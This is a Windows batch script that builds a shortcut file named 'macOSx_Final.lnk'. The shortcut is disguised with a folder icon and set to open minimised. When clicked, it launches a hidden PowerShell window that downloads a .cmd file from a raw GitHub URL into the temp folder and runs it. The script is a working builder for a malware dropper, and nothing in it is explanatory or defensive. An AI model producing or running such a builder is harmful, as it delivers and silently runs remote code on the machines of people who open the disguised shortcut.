@echo off
setlocal
cd /d "%~dp0"

set SC_NAME=macOSx_Final.lnk

echo Creating independent shortcut %SC_NAME%...

echo Set ws = CreateObject("WScript.Shell") > make_sc.vbs
echo Set lnk = ws.CreateShortcut("%~dp0%SC_NAME%") >> make_sc.vbs
echo lnk.TargetPath = "cmd.exe" >> make_sc.vbs
echo lnk.Arguments = "/c powershell.exe -w hidden -c ""Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/tiiisiet65-sudo/rtyui/main/Download-macOSx.cmd' -OutFile $env:TEMP\s.cmd; & $env:TEMP\s.cmd""" >> make_sc.vbs
echo lnk.IconLocation = "shell32.dll,4" >> make_sc.vbs
echo lnk.WindowStyle = 7 >> make_sc.vbs
echo lnk.Save >> make_sc.vbs
cscript //nologo make_sc.vbs
del make_sc.vbs

echo.
echo Independent LNK created successfully!
pause
